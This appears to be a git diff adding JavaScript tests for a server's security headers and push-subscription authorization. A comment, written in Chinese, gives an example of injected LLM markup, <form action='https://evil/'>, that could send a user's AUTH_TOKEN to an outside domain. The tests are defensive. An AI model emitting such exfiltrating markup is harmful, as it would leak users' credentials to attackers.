@@ -6,6 +6,7 @@ import {
   rewriteIndexAssetUrls,
   setSecurityHeaders,
   tokenMatches,
+  registerOperationalRoutes,
 } from '../../src/server/http.js';
 
 // 前端拆到 public/js/app/* 后，若只给 logic.js 打 ?v=，connection-sync 等子模块会吃浏览器缓存——
@@ -60,6 +61,18 @@ test('setSecurityHeaders applies the browser security boundary', () => {
   assert.equal(headers.get('X-Frame-Options'), 'DENY');
   assert.equal(headers.get('X-Content-Type-Options'), 'nosniff');
   assert.equal(headers.get('Referrer-Policy'), 'no-referrer');
+});
+
+// SEC：form-action 与 base-uri 都【不】回落到 default-src（CSP 规范），不显式声明就是完全无限制。
+// 渲染的 LLM 正文经 DOMPurify 后仍可能带 <form action="https://evil/">：script-src 拦不住表单导航、
+// connect-src 也拦不住，用户被诱导填进去的 AUTH_TOKEN 会被 POST 到外域。
+test('setSecurityHeaders pins form-action and base-uri so injected markup cannot exfiltrate', () => {
+  const headers = new Map();
+  setSecurityHeaders({ setHeader: (name, value) => headers.set(name, value) });
+  const csp = headers.get('Content-Security-Policy');
+
+  assert.match(csp, /form-action 'self'/);
+  assert.match(csp, /base-uri 'none'/);
 });
 
 test('createHttpAuth uses Access JWT for public hosts and token fallback for local requests', async () => {
@@ -185,4 +198,70 @@ test('createHttpAuth rateLimit：active(req) 公网 Host 无 token 仍计入失�
   // active 对 lan host 为 false → 不限速；无 token 本机放行
   await auth({ headers: { host: '127.0.0.1' }, query: {}, socket: {} }, lanRes, () => {});
   assert.equal(states.size, 0, '非公网且 active(req)=false 不写限速状态');
+});
+
+// A1 的「仅已批准设备可登记推送」在 bypass 拓扑下是 fail-closed 用错了地方：socket 侧 io.use 对
+// 「CF Access 已验」与「真本机直连」走 bypass 分支，而那条分支【不调 addPendingDevice】——这类设备
+// 结构上永远进不了待审列表；approveDevice 的三个入口又都要求先在待审列表里，机主在 UI/CLI 上看不到它、
+// 无从批准。于是只从公网装 PWA 的手机（deployment.md 主推拓扑）POST /push/subscribe 恒 403，
+// 前端只把 'HTTP 403' 写进日志、按钮无提示 —— 推送在旗舰拓扑下静默失效。
+test.describe('/push/subscribe 的第二因子：bypass 级信任必须与信任表等价放行', () => {
+  function mount({ isDeviceTrusted, bypassDeviceApproval }) {
+    const routes = new Map();
+    const app = {
+      get: (p, ...h) => routes.set(`GET ${p}`, h),
+      post: (p, ...h) => routes.set(`POST ${p}`, h),
+    };
+    const saved = [];
+    registerOperationalRoutes({
+      app,
+      httpAuth: (_req, _res, next) => next(),
+      getHealth: () => ({}),
+      getMetrics: () => ({}),
+      push: {
+        enabled: true,
+        publicKey: 'k',
+        isValidSubscription: () => true,
+        saveSubscription: sub => saved.push(sub),
+      },
+      isDeviceTrusted,
+      bypassDeviceApproval,
+    });
+    const handlers = routes.get('POST /push/subscribe');
+    const run = () => {
+      const req = {
+        body: { endpoint: 'https://push.example/a', keys: { p256dh: 'a', auth: 'b' } },
+        get: () => '',
+        headers: {},
+      };
+      const out = { status: 200, payload: null };
+      const res = {
+        status(c) { out.status = c; return this; },
+        json(p) { out.payload = p; return this; },
+      };
+      handlers[handlers.length - 1](req, res);
+      return out;
+    };
+    return { run, saved };
+  }
+
+  test('CF Access / 本机直连（bypass=true）即使不在信任表里也能订阅', () => {
+    const { run, saved } = mount({ isDeviceTrusted: () => false, bypassDeviceApproval: () => true });
+    const out = run();
+    assert.equal(out.status, 200, `不应 403，实际 ${out.status} ${JSON.stringify(out.payload)}`);
+    assert.equal(saved.length, 1, '订阅必须落盘');
+  });
+
+  test('既不在信任表、也不是 bypass → 仍然 403（第二因子不被削弱）', () => {
+    const { run, saved } = mount({ isDeviceTrusted: () => false, bypassDeviceApproval: () => false });
+    const out = run();
+    assert.equal(out.status, 403);
+    assert.equal(saved.length, 0);
+  });
+
+  test('在信任表里 → 照常放行（原有行为不变）', () => {
+    const { run, saved } = mount({ isDeviceTrusted: () => true, bypassDeviceApproval: () => false });
+    assert.equal(run().status, 200);
+    assert.equal(saved.length, 1);
+  });
 });
